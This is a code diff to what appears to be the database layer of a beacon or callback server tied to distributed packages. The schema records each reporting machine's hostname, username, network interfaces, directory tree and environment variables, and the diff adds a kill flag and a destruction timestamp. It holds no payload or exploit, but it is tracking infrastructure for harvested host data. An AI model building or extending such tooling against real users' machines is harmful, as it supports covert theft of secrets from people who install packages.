@@ -19,20 +19,22 @@ CREATE TABLE IF NOT EXISTS packages (
 );
 
 CREATE TABLE IF NOT EXISTS beacons (
-  id          INTEGER PRIMARY KEY AUTOINCREMENT,
-  beacon_id   TEXT NOT NULL UNIQUE,
-  pkg_name    TEXT NOT NULL,
-  hostname    TEXT,
-  username    TEXT,
-  platform    TEXT,
-  arch        TEXT,
-  os_release  TEXT,
-  interfaces  TEXT,
-  dir_tree    TEXT,
-  env_vars    TEXT,
-  cwd         TEXT,
-  last_seen   INTEGER NOT NULL DEFAULT (unixepoch()),
-  created_at  INTEGER NOT NULL DEFAULT (unixepoch())
+  id           INTEGER PRIMARY KEY AUTOINCREMENT,
+  beacon_id    TEXT NOT NULL UNIQUE,
+  pkg_name     TEXT NOT NULL,
+  hostname     TEXT,
+  username     TEXT,
+  platform     TEXT,
+  arch         TEXT,
+  os_release   TEXT,
+  interfaces   TEXT,
+  dir_tree     TEXT,
+  env_vars     TEXT,
+  cwd          TEXT,
+  last_seen    INTEGER NOT NULL DEFAULT (unixepoch()),
+  created_at   INTEGER NOT NULL DEFAULT (unixepoch()),
+  kill         INTEGER NOT NULL DEFAULT 0,
+  destroyed_at INTEGER
 );
 
 CREATE TABLE IF NOT EXISTS heartbeats (
@@ -43,6 +45,9 @@ CREATE TABLE IF NOT EXISTS heartbeats (
 `;
 
 db.exec(SCHEMA);
+// ponytail: idempotent column additions for existing DBs (ALTER TABLE throws if column exists)
+try { db.exec('ALTER TABLE beacons ADD COLUMN kill INTEGER NOT NULL DEFAULT 0'); } catch (_) {}
+try { db.exec('ALTER TABLE beacons ADD COLUMN destroyed_at INTEGER'); } catch (_) {}
 
 export default db;
 
@@ -68,4 +73,6 @@ export type Beacon = {
   cwd: string | null;
   last_seen: number;
   created_at: number;
+  kill: number;
+  destroyed_at: number | null;
 };
